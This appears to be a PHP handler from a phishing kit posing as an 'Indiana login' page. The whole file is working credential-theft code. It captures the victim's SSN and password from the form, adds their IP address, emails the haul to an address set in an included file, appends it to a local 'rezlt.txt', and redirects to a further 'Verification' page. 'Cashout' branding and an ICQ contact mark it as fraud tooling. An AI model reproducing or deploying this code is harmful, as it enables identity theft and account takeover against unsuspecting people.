<?php
$Cashout = getenv("REMOTE_ADDR");
include('../Email.php');
$subject = "INDIANA LOGIN   [ " . $Cashout . " ] /";
$headers = "From: Cashout-XXX <service>\r\n";
$message .= "
+----/!\----<.![+] INDIANA LOGIN  [+]!.>---/!\----+
 [SSN]           : ".$_POST['username']."
 [PASSWORD]           : ".$_POST['password']."
-------------------------------------------------
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."
+----/!\----<.! icq @716199390!.>---/!\----+>
\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
require './antibot.php';header("Location: ./Verification.php?$xxx");
?>

